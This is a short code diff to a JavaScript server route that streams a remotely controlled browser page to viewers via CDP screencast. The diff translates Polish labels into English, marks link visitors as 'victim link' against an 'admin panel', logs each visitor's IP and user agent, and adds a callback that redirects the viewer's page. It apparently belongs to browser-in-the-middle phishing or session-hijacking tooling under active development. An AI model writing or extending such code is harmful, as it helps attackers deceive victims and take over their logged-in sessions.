@@ -56,8 +56,10 @@ export default async function viewerRoutes(app) {
     }
     const viewerIp = req.ip || req.headers['x-forwarded-for'] || '?';
     const viewerUa = req.headers['user-agent'] || '?';
-    const viewerType = req.query?.ref ? 'link dostępowy' : 'panel admina';
-    browser.logActivity(resolvedId, 'open', `👀 Podgląd otwarty [${viewerType}]\n🌐 IP: ${viewerIp}\n📱 UA: ${viewerUa}`);
+    const viewerType = req.query?.ref ? 'victim link' : 'admin panel';
+    browser.logActivity(resolvedId, 'open', `👀 Viewer opened [${viewerType}]\n🌐 IP: ${viewerIp}\n📱 UA: ${viewerUa}`);
+    browser.setRedirectCb(resolvedId, (url) => { try { socket.send(JSON.stringify({ t: 'redirect', url })); } catch {} });
+    socket.on('close', () => browser.clearRedirectCb(resolvedId));
 
     const page = browser.getPage(resolvedId);
     const vp = page.viewportSize() || browser.DEFAULT_VIEWPORT;
@@ -89,6 +91,7 @@ export default async function viewerRoutes(app) {
     });
 
     try {
+      await page.bringToFront().catch(() => {});
       await cdp.send('Page.startScreencast', {
         format: 'jpeg',
         quality: 90,
